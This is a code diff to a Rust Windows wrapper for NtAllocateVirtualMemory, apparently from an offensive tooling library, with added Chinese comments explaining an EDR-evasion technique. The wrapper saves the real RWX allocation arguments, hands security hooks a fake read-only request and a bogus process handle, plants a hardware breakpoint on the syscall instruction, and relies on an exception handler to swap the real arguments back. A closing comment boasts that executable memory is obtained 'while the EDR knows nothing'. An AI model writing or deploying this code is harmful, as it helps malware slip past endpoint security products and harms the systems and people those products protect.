@@ -34,11 +34,12 @@ pub fn LoadLibraryA(module: &str) -> *mut c_void {
 
 /// Wrapper for the `NtAllocateVirtualMemory` function from `NTDLL.DLL`.
 #[allow(unused_mut)]
+// 两个mut参数,就是即将修改进行欺骗的关键
 pub fn NtAllocateVirtualMemory(
     mut process_handle: HANDLE,
-    base_address: *mut *mut c_void,
+    base_address: *mut *mut c_void,//双指针
     zero_bits: usize,
-    region_size: *mut usize,
+    region_size: *mut usize,//双指针
     allocation_type: u32,
     mut protect: u32,
 ) -> NTSTATUS {
@@ -46,6 +47,10 @@ pub fn NtAllocateVirtualMemory(
         if #[cfg(any(target_arch = "x86", target_arch = "x86_64"))] {
             // Handle debugging breakpoints, if enabled.
             if is_breakpoint_enabled() {
+                
+                // 保存真实意图需要用到的参数
+                // 修改参数之前,必须保存一份真实意图的参数到CURRENT_API中
+                // 之后触发硬件断点后,VEH(异常处理函数)会从这里读取要执行的参数,并填回寄存器或堆栈中,让内核执行
                 unsafe {
                     CURRENT_API = Some(WINAPI::NtAllocateVirtualMemory {
                         ProcessHandle: process_handle,
@@ -55,13 +60,22 @@ pub fn NtAllocateVirtualMemory(
                 
                 // Argument tampering before syscall execution.
                 // Modifies the memory protection to PAGE_READONLY.
+                // 修改为无害的只读权限
                 protect = 0x02;
         
                 // Replaces the process handle with an arbitrary value.
                 process_handle = -23isize as HANDLE; 
-                
+                // 将原本向申请的RWX改为R,原本指向自身的进程句柄-1改为-23(或其他任意值)
+                // 如果spoof失败(断点未触发).系统会因调用无效句柄而直接返回错误,而不会导致程序崩溃或执行其他恶意内容.同时向EDR AV展示了一个意图无法判定的调用
+
+
                 // Locate and set a breakpoint on the NtAllocateVirtualMemory syscall.
+                // get_ntdll_address(),遍历PEB->Ldr->InMemoryOrderModuleList 找到ntdll.dll的基址
+                // get_proc_address 解析ntdll.dll的导出表找到NtAllocateVirtualMemory函数地址
                 let addr = super::module::get_proc_address(get_ntdll_address(), s!("NtAllocateVirtualMemory"), None);
+
+                // get_syscall_address 返回syscall指令机器码的内存地址
+                // set_breakpoint 设置断点
                 if let Some(syscall_addr) = super::get_syscall_address(addr) {
                     set_breakpoint(syscall_addr);
                 }
@@ -69,19 +83,34 @@ pub fn NtAllocateVirtualMemory(
         }
     }
 
+    // 发起传入的虚假参数的调用,spoof EDR Av
     dinvoke!(
         get_ntdll_address(),
         s!("NtAllocateVirtualMemory"),
         NtAllocateVirtualMemoryFn,
-        process_handle,
+        process_handle, // -23
         base_address,
         zero_bits,
         region_size,
         allocation_type, 
-        protect
+        protect         // 0x02(Read-Only)
     )
     .unwrap_or(STATUS_UNSUCCESSFUL)
 }
+// 1. 准备：保存真实参数（RWX）。
+// 2. 伪装：修改参数为假参数（Read-Only）。
+// 3. 设伏：在 syscall 处下断点。
+// 4. 出发：调用函数。
+// 5. EDR 检查：EDR 看到是 Read-Only，放行。
+// 6. 触发断点：代码运行到 syscall，砰！触发异常。
+// 7. 偷天换日 (VEH)：
+//    * 程序的异常处理函数（在 src/breakpoint.rs 中）捕获异常。
+//    * 它发现是 NtAllocateVirtualMemory 触发的。
+//    * 它从 CURRENT_API 取出真实的 RWX 参数。
+//    * 它修改 CPU 寄存器/堆栈，把假的 Read-Only 替换回 RWX。
+// 8. 进内核：异常处理结束，恢复执行 syscall。此时进入内核的参数已经是 RWX 了。
+// 9. 结果：你成功申请到了可执行内存，而 EDR 一无所知。
+
 
 /// Wrapper for the `NtProtectVirtualMemory` function from `NTDLL.DLL`.
 #[allow(unused_mut)]
